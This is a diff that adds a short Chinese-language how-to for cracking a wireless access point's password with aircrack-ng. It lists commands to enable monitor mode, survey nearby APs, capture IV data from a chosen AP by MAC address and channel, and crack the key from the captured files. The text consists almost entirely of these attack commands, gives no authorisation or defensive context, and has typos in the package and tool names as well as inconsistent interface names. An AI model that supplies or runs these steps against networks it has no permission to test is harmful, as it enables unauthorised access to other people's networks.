@@ -1,0 +1,26 @@
+安装aircrack-ng
+
+yaourt -S aricrack-ng
+
+打开无线网卡监听模式 设无线网卡为wlan0
+
+airmon-ng start wlan0
+
+这时通常会多出一个mon0设备，这个设备就是打开了监听模式的wlan0
+
+察看当前工作所有的无线ap
+
+airodump-ng wlp3s0mon
+
+从破解的ap抓取数据
+
+airodump-ng --ivs -d AP_MAC_地址 -w data
+
+-c 用来制定频道, 频道在ariodump的时候可以看到
+airodump-ng --ivs -d AP_MAC_地址 -c number -w data
+
+破解密码
+
+当抓取的数据足够多就用
+
+aircrack-ng data*
